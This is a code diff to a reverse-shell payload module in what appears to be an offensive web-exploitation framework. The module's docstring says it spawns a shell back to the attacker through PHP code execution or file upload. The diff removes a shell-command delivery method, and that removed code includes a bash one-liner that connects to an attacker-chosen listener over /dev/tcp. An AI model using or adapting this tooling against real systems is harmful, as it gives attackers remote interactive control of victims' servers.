@@ -5,8 +5,10 @@ Spawns a reverse shell back to the attacker.
 
 Delivery methods:
     RCE  — Execute reverse shell via PHP
-    RCEs — Execute reverse shell via system command
     AFU  — Upload PHP reverse shell file
+
+The payload emits PHP. If the vulnerable sink is an OS shell, the exploit wraps
+the PHP as `php -r` itself (see Exploit.php_shell).
 
 Note: RFI is not supported since the reverse shell PHP contains
 dynamic lhost/lport values that can't be pre-hosted.
@@ -21,7 +23,7 @@ from hwp import Payload
 
 class RevShell(Payload):
     name = "Reverse Shell"
-    methods = ["RCE", "RCEs", "AFU"]
+    methods = ["RCE", "AFU"]
     description = "Spawn a reverse shell to your listener"
     options = [
         {"name": "lhost", "default": "", "help": "Listener IP", "required": True},
@@ -47,9 +49,6 @@ class RevShell(Payload):
                 f"?>"
             )
             return [php]
-
-        elif self.method == "RCEs":
-            return [f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"]
 
         elif self.method == "AFU":
             php = (
